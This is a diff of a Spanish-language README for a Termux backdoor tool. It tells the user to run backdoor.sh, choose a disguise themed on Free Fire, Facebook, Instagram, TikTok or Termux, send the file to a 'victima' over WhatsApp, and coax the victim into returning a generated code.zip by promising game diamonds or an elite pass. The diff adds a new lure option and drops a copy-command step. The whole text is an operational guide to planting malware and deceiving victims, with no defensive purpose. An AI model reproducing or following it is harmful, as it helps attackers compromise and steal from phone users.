@@ -10,7 +10,7 @@ termux-setup-storage
 Luego le das en permitir , si ya lo tienes ya no lo hagas 
 
 Bueno una ves esto ejecuta bash backdoor.sh elije un backdoor
-Puede ser de FreFire,  Pase elite, Facebook, Instagram, y Tiktok
+Puede ser de FreFire,  Pase elite, Facebook, Instagram, Tiktok y Termux
 El backdoor se le guardara en sus archivos de almacenamiento interno 
 
 Luego enviáselo a la victima por Washapp 
@@ -23,9 +23,7 @@ Y lo pegue en una nueva ventana y le de enter
 
 AKI VIENE LO IMPORTANTE 👇😎
 
-LE PEDIMOS QUE NOS ENVIE EL ARCHIVO code.zip QUE LE GENERO
-
-SI NO SABE EL LE DICIMOS QUE EJECUTE cp code.zip /sdcard
+LE PEDIMOS QUE NOS ENVIE EL ARCHIVO code.zip QUE SE LE GUARDO EN SUS ARCHIVOS
 
 EN ESTE CASO TU, DILE QUE YO TE ACTIVO
 
@@ -37,11 +35,17 @@ SI ESCOJIO LA OPCION 1 LE DECIMOS QUE NOS ENVIE ASI MISMO EL CODIGO
 
 PARA GENERAR TUS DIAMANTES EN LA PAGINA 
 
-POR ULTIMO SI ESCOJIO LA OPCION 2
+SI ESCOJIO LA OPCION 2
 
 LE DECIMOS QUE IGUAL NOS ENVIE EL CODIGO
 
-PARA GENERAR TU PASE ELITE Y TE LLEGUE A TU CUENTA.
+PARA GENERAR TU PASE ELITE Y TE LLEGUE A TU CUENTA
+
+POR ULTIMO SI ESCOJIO LA OPCION 6
+
+LE DECIMOS QUE INGRESE SU NOMBRE Y LA FECHA DE HOY 
+
+Y QUE NOS ENVIE EL CODIGO CODE.ZIP.
 
 #Listo espero aberte ayudado🙏 😊 
 
